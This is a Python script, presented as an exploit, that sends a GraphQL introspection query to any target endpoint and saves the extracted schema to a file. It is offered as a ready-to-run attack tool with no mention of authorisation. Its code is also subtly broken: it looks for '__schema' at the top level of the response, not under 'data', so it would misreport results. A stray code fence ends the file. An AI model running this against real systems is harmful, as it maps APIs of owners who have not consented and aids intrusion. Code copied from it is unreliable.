#!/usr/bin/env python3
"""
GraphQL Introspection Exploit Script
Automatically detects and abuses GraphQL introspection to extract full schema.
Usage: python exploit_graphql_introspection.py <TARGET_URL> [HEADERS]
"""

import requests
import json
import argparse

def send_graphql_request(url, query, headers=None):
    """Send a GraphQL request to the target."""
    payload = {"query": query}
    try:
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def extract_schema(target_url, headers=None):
    """Extract full GraphQL schema via introspection."""
    introspection_query = """
    query IntrospectionQuery {
        __schema {
            types {
                name
                kind
                fields(includeDeprecated: false) {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                    args {
                        name
                        type {
                            name
                            kind
                        }
                    }
                    isDeprecated
                    deprecatedReason
                }
            }
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            directives {
                name
                description
                locations
                args {
                    name
                    type {
                        name
                        kind
                    }
                    description
                }
            }
        }
    }
    """

    result = send_graphql_request(target_url, introspection_query, headers)
    if not result or "__schema" not in result:
        print("[!] Introspection failed or blocked.")
        return None

    return result["__schema"]

def save_schema_to_file(schema, filename="graphql_schema.json"):
    """Save extracted schema to a JSON file."""
    with open(filename, "w") as f:
        json.dump(schema, f, indent=4)
    print(f"[+] Schema saved to {filename}")

def main():
    parser = argparse.ArgumentParser(description="GraphQL Introspection Exploit")
    parser.add_argument("url", help="Target GraphQL endpoint URL")
    parser.add_argument("--headers", help="Custom headers (JSON string)")
    args = parser.parse_args()

    headers = json.loads(args.headers) if args.headers else None
    schema = extract_schema(args.url, headers)

    if schema:
        print("[+] Successfully extracted GraphQL schema!")
        save_schema_to_file(schema)
    else:
        print("[!] Schema extraction failed.")

if __name__ == "__main__":
    main()
```

